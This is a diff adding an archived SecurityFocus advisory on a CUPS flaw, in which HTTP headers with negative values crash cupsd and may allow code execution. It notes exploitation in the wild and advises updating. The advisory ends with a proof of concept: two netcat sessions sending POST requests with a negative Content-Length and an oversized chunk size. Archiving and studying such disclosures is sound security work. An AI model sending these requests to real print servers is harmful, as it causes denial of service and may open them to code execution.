@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/6437/info
+
+A vulnerability has been reported for CUPS that if exploited may result in a DoS or the execute of code on affected systems.
+
+An attacker can exploit this vulnerability by connecting to a vulnerable system and issuing malformed HTTP headers with a negative value for some fields. When the cupsd service receives this request, it will crash.
+
+This vulnerability is very similar to the issue described in BID 5033. It may be very likely that this vulnerability may be exploited to execute malicious attacker-supplied code on BSD, and possibly other, platforms.
+
+*** January 05, 2003
+
+There are reports of this vulnerability being actively exploited in the wild. Vulnerable users are advised to update immediately.
+
+$ nc -v localhost 631
+localhost [127.0.0.1] 631 (?) open
+POST /printers HTTP/1.1
+Host: localhost
+Authorization: Basic AAA
+Content-Length: -1
+
+$ nc -v localhost 631
+localhost [127.0.0.1] 631 (?) open
+POST /printers HTTP/1.1
+Host: localhost
+Authorization: Basic AAA
+Transfer-Encoding: chunked
+
+- - - - -FFFFFFFE
